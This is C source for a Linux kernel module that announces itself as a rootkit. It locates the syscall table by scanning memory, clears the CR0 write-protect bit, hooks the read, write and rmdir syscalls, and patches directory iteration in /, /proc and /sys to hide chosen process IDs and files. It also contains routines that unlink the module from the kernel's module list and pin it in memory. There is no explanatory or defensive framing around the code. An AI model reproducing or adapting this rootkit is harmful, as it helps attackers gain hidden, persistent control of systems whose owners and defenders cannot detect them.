#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/usb.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000

void **sys_call_table;

void **find_syscall_table(void) {
    void **sctable;
    void *i = (void *) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            const unsigned int SYS_CALL_NUM = 300;
            for (j = 0; j < SYS_CALL_NUM; j++) {
                if (sctable[j] == NULL) {
                    goto skip;
                }
            }
            return sctable;
        }
        skip:;
        i += sizeof(void *);
    }

    return NULL;
}

/////////////////////////////////////////////////////////////////////////////////////////

struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

int hook_create(void **modified_at_address, void *modified_function) {
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    do {
        preempt_disable();
        write_cr0(read_cr0() & (~ 0x10000));
    } while (0);
    h->original_function = xchg(modified_at_address, modified_function);
    do {
        preempt_enable();
        write_cr0(read_cr0() | 0x10000);
    } while (0);


    return 1;
}


void *hook_get_original(void *modified_function) {
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list)
    {
        if (h->modified_function == modified_function) {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

void hook_remove_all(void) {
    struct hook *h, *tmp;

    list_for_each_entry(h, &hook_list, list)
    {
        do {
            preempt_disable();
            write_cr0(read_cr0() & (~ 0x10000));
        } while (0);
        *h->modified_at_address = h->original_function;
        do {
            preempt_enable();
            write_cr0(read_cr0() | 0x10000);
        } while (0);
    }

    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list)
    {
        list_del(&h->list);
        kfree(h);
    }
}


/////////////////////////////////////////////////////////////////////////////////////////

unsigned long read_count = 0;

asmlinkage long read(unsigned int fd, char __user *buf, size_t count){
    read_count ++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    return original_read(fd, buf, count);
}

unsigned long write_count = 0;

asmlinkage long write(unsigned int fd, const char __user*buf, size_t count){
    write_count ++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}


/////////////////////////////////////////////////////////////////////////////////////////

#define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define ASM_HOOK_CODE_OFFSET 2

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE) - 1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);


void _asm_hook_patch(struct asm_hook *h) {
    do {
        preempt_disable();
        write_cr0(read_cr0() & (~ 0x10000));
    } while (0);
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE) - 1);
    *(void **) &((char *) h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    do {
        preempt_enable();
        write_cr0(read_cr0() | 0x10000);
    } while (0);
}

int create_interceptor(void *original_function, void *modified_function) {
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE) - 1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

void asm_hook_patch(void *modified_function) {
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

void _asm_hook_unpatch(struct asm_hook *h) {
    do {
        preempt_disable();
        write_cr0(read_cr0() & (~ 0x10000));
    } while (0);
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE) - 1);
    do {
        preempt_enable();
        write_cr0(read_cr0() | 0x10000);
    } while (0);
}

void *asm_hook_unpatch(void *modified_function) {
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

void asm_hook_remove_all(void) {
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list)
    {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}


/////////////////////////////////////////////////////////////////////////////////////////

unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
  asm_rmdir_count ++;

  asmlinkage long (*original_rmdir)(const char __user*);
  original_rmdir = asm_hook_unpatch(asm_rmdir);
  long ret = original_rmdir(pathname);
  asm_hook_patch(asm_rmdir);

  return ret;
}


/////////////////////////////////////////////////////////////////////////////////////////

struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_hide(const int *pid) {
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p) {
        return 0;
    }

    p->pid = pid;

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_show(const int *pid) {
    struct pid_entry *p, *tmp;

    unsigned long pid_num = pid;

    list_for_each_entry_safe(p, tmp, &pid_list, list)
    {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_show_all(void) {
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list)
    {
        list_del(&p->list);
        kfree(p);
    }
}

/////////////////////////////////////////////////////////////////////////////////////////

struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_hide(const char *name) {
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);

    if (!f) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    if (name_len - 1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;
}

void file_show(const char *name) {
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list)
    {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_show_all(void) {
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list)
    {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}

/////////////////////////////////////////////////////////////////////////////////////////

struct list_head *module_list;
int is_hidden = 0;

void hide(void) {
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}


void show(void) {
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}

/////////////////////////////////////////////////////////////////////////////////////////

int is_protected = 0;

void protect(void) {
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void unprotect(void) {
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}

/////////////////////////////////////////////////////////////////////////////////////////


struct file_operations *get_fop(const char *path) {
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}

/////////////////////////////////////////////////////////////////////////////////////////
filldir_t original_root_filldir;

static int root_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
{

    struct file_entry *f;

    list_for_each_entry(f, &file_list, list)
    {
        if (strcmp(name, f->name) == 0) {
            return 0;
        }
    }

    return original_root_filldir(context, name, namelen, offset, ino, d_type);
}

int root_iterate(struct file *file, struct dir_context *context)
{
    original_root_filldir = context->actor;
    *((filldir_t*)&context->actor) = root_filldir;

    int (*original_iterate)(struct file *, struct dir_context *);
    original_iterate = asm_hook_unpatch(root_iterate);
    int ret = original_iterate(file, context);
    asm_hook_patch(root_iterate);

    return ret;
}
/////////////////////////////////////////////////////////////////////////////////////////

filldir_t original_proc_filldir;

static int proc_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
    struct pid_entry *p;

    list_for_each_entry(p, &pid_list, list)
    {
        if (simple_strtoul(name, NULL, 10) == p->pid) {
            return 0;
        }
    }

    return original_proc_filldir(context, name, namelen, offset, ino, d_type);
}

int proc_iterate(struct file *file, struct dir_context *context)
{
    original_proc_filldir = context->actor;
    *((filldir_t*)&context->actor) = proc_filldir;

    int (*original_iterate)(struct file *, struct dir_context *);
    original_iterate = asm_hook_unpatch(proc_iterate);
    int ret = original_iterate(file, context);
    asm_hook_patch(proc_iterate);

    return ret;
}
/////////////////////////////////////////////////////////////////////////////////////////

filldir_t original_sys_filldir;

static int sys_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }
    return original_sys_filldir(context, name, namelen, offset, ino, d_type);
}

int sys_iterate(struct file *file, struct dir_context *context)
{
    original_sys_filldir = context->actor;
    *((filldir_t*)&context->actor) = sys_filldir;

    int (*original_iterate)(struct file *, struct dir_context *);
    original_iterate = asm_hook_unpatch(sys_iterate);
    int ret = original_iterate(file, context);
    asm_hook_patch(sys_iterate);

    return ret;
}

/////////////////////////////////////////////////////////////////////////////////////////


static int pen_probe(struct usb_interface *interface, const struct usb_device_id *id)
{
    printk(KERN_INFO "Pen drive (%04X:%04X) plugged\n", id->idVendor, id->idProduct);

    return 0;
}

static void pen_disconnect(struct usb_interface *interface)
{
    printk(KERN_INFO "Pen drive removed\n");
}

static struct usb_device_id pen_table[] =
        {
                { USB_DEVICE(0x1a86, 0x7523) },
                {} /* Terminating entry */
        };
MODULE_DEVICE_TABLE (usb, pen_table);

static struct usb_driver pen_driver =
        {
                .name = "pen_driver",
                .id_table = pen_table,
                .probe = pen_probe,
                .disconnect = pen_disconnect,
        };




int init_module(void) {


    usb_register_driver(&pen_driver, THIS_MODULE, KBUILD_MODNAME);

    printk(KERN_INFO "rootkit installed!\n");


    create_interceptor(get_fop("/")->iterate, root_iterate);
    create_interceptor(get_fop("/proc")->iterate, proc_iterate);
    create_interceptor(get_fop("/sys")->iterate, sys_iterate);

    sys_call_table = find_syscall_table();

    create_interceptor(sys_call_table[__NR_rmdir], asm_rmdir);

    hook_create(&sys_call_table[__NR_read], read);
    hook_create(&sys_call_table[__NR_write], write);

    // hide();
    // protect();
    pid_hide(1);
    file_hide("TypeRacer.tar.gz");
    file_hide("rootkit_folder");

    return 0;
}

void cleanup_module(void) {


    hook_remove_all();
    asm_hook_remove_all();
    pid_show_all();
    file_show_all();

    usb_deregister(&pen_driver);

    // show();
    // unprotect();
    // pid_show(1);
    // file_show("TypeRacer.tar.gz");

    THIS_MODULE->name[0] = 0;

    printk(KERN_INFO "rootkit removed!\n");
}
